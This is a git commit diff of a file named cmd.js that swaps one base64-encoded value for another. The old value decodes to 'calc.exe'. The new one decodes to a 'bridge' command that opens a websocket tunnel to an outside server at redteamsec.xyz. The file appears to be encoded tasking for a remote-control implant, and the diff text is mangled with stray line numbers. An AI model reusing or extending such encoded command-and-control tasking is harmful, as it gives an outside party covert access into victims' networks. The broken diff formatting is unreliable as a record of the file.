9920819dff109d3896db82cb7b78c71efd712f46
Leonardo Marostegam <82916289+leomarostegam@users.noreply.github.com>
2025-07-30 14:08:53 -0300

    Update cmd.js

--- cmd.js
+++ cmd.js
@@ -1,1 +1,6 @@
-{ "u": "Y2FsYy5leGU=" }
+  1 -  { "u": "eyJjb21hbmRvIjoiYnJpZGdlIiwiYnJpZGdlIjp7InR5cGUiOiJ3ZWJzb2NrZXQiLCJzZXJ2ZXIiOiJ3c3M6Ly93d3cucmVkdGVh
+       1   \ No newline at end of file
+       2 +  { "u":
+     "eyJjb21hbmRvIjoiYnJpZGdlIiwiYnJpZGdlIjp7InR5cGUiOiJ3ZWJzb2NrZXQiLCJzZXJ2ZXIiOiJ3c3M6Ly93d3cucmVkdGVhbXNlYy54eXovd3
+         + MiLCJsb2NhbFBvcnQiOjg3NjV9fQo=" }
+       3   \ No newline at end of file
